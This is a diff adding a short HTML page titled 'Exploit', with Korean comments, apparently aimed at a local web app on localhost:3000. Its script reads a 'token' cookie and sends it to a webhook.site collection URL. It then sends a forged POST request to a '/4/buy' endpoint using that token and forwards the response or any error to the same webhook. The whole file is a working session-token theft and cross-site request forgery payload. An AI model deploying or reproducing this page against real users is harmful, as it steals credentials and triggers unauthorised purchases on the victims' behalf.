@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Exploit</title>
+</head>
+<body>
+  <script>
+    const token = document.cookie.split('token=')[1]?.split(';')[0];
+    
+    // 먼저 토큰이 있는지 확인
+    fetch('https://webhook.site/49a58c37-eb88-47dc-aa89-3931c4df2c95?token=' + encodeURIComponent(token || 'no_token'));
+    
+    fetch('http://localhost:3000/4/buy', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'token': token
+      }
+    })
+    .then(r => r.text())  // JSON 대신 text로 받기
+    .then(data => {
+      fetch('https://webhook.site/49a58c37-eb88-47dc-aa89-3931c4df2c95?response=' + encodeURIComponent(data));
+    })
+    .catch(e => {
+      fetch('https://webhook.site/49a58c37-eb88-47dc-aa89-3931c4df2c95?error=' + encodeURIComponent(e.toString()));
+    });
+  </script>
+</body>
+</html>
